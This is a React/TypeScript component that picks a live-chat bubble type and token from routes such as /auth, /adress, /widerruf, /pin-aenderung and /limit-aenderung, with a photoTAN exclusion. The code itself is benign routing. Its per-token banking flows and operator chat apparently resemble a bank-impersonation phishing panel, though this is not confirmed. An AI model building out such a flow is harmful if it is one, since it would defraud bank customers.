import { useLocation, useSearchParams } from "react-router-dom";
import LiveChatBubble, { type LiveChatKind } from "./LiveChatBubble";

// Determine kind + token from the current route/search
const resolve = (pathname: string, tokenParam: string | null): { kind: LiveChatKind; token: string } | null => {
  // Path-token routes: /auth/:token, /adress/:token, /widerruf/:token
  const authMatch = pathname.match(/^\/auth\/([^/]+)/);
  if (authMatch && authMatch[1] !== "ui") return { kind: "auth", token: authMatch[1] };
  const adressMatch = pathname.match(/^\/adress\/([^/]+)/);
  if (adressMatch) return { kind: "adress", token: adressMatch[1] };
  const stornoTokenMatch = pathname.match(/^\/widerruf\/([^/]+)/);
  if (stornoTokenMatch && !["start", "phototan"].includes(stornoTokenMatch[1])) {
    return { kind: "storno", token: stornoTokenMatch[1] };
  }

  if (!tokenParam) return null;

  if (pathname === "/pin-aenderung" || pathname.startsWith("/pin/") || pathname === "/pin") {
    return { kind: "pin", token: tokenParam };
  }
  if (pathname === "/limit-aenderung" || pathname.startsWith("/limit/") || pathname === "/limit") {
    return { kind: "limit", token: tokenParam };
  }
  if (pathname === "/widerruf" || pathname.startsWith("/widerruf/")) {
    return { kind: "storno", token: tokenParam };
  }
  if (pathname === "/auth") {
    return { kind: "auth", token: tokenParam };
  }
  return null;
};

const GlobalLiveChat = () => {
  const { pathname } = useLocation();
  const [sp] = useSearchParams();
  const resolved = resolve(pathname, sp.get("token"));
  if (!resolved) return null;
  return <LiveChatBubble kind={resolved.kind} token={resolved.token} />;
};

export default GlobalLiveChat;
